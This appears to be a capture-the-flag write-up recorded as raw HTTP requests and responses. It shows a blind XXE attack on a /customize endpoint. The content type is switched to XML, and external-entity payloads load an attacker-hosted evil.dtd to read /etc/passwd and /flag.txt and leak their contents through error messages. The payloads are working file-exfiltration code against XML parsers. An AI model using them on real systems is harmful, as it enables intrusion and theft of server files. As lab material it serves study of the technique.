# Stage 1
/*
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 33
Content-Type: application/json
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

{"color" : "red", "size": "20px"}


// Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 11:50:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7
Connection: close
Vary: Cookie

DONE :D

'''

# Stage 2
'''
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 33
Content-Type: application/xml
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

{"color" : "red", "size": "20px"}


// Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 11:52:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 70
Connection: close
Vary: Cookie

Start tag expected, '<' not found, line 1, column 1 (<string>, line 1)


'''

# Stage 3
'''
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 175
Content-Type: application/xml
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pocas [<!ENTITY xxe SYSTEM "http://141.164.52.207/test">]>
<pocas>
    <color>&xxe;</color>
    <size>40px</size>
</root>


// Aapache Log
207.180.200.166 - - [31/Jan/2021:12:14:10 +0000] "GET /test HTTP/1.0" 404 456 "-" "-"

'''

# Stage 4

'''
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 170
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Content-Type: application/xml
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % xxe SYSTEM "http://141.164.52.207/evil.dtd">
%xxe;
]>


// Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 12:04:41 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1343
Connection: close
Vary: Cookie

Invalid URI: http://141.164.52.207/root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
(생략)
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
uwsgi:x:100:101:uwsgi:/dev/null:/sbin/nologin
, line 2, column 77 (evil.dtd, line 2)

'''

# Stage 4
'''
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 168
Content-Type: application/xml
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % xxe SYSTEM "http://141.164.52.207/evil.dtd">
%xxe;
]>


// Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 12:17:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Connection: close
Vary: Cookie

Invalid URI: http://141.164.52.207/flag{i7_1s_n0t_s0_bl1nd3721}
, line 2, column 77 (evil.dtd, line 2)

'''
*/
//Output : flag{i7_1s_n0t_s0_bl1nd3721}
